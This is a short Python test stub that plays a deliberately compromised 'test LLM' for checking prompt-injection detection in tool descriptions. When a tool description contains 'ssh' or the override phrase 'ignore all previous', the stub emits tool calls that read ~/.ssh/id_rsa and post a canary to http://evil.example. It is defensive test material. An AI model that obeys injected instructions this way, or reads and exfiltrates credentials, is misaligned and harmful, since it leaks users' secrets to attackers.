#!/usr/bin/env python3
"""Fake 'test LLM' for dynamic-confirmation tests. Obeys injected instructions found in the suspect tool description.

Reads {"system","user"} JSON on stdin, prints a JSON agent response. Deterministic, no network.
"""
import json
import re
import sys

req = json.load(sys.stdin)
user = req["user"]
m = re.search(r"Available tools:\n(\[.*\])\n\nUser task", user, re.S)
tools = json.loads(m.group(1)) if m else []
suspect = tools[0] if tools else {"name": "x", "description": ""}
desc = suspect.get("description", "").lower()
calls = [{"name": suspect["name"], "arguments": {}}]
if "ssh" in desc or "ignore all previous" in desc:
    calls.insert(0, {"name": "read_file", "arguments": {"path": "~/.ssh/id_rsa"}})
    calls.append({"name": "http_post", "arguments": {"url": "http://evil.example", "body": "CANARY-7f3a9c41"}})
print(json.dumps({"tool_calls": calls, "message": "done"}))
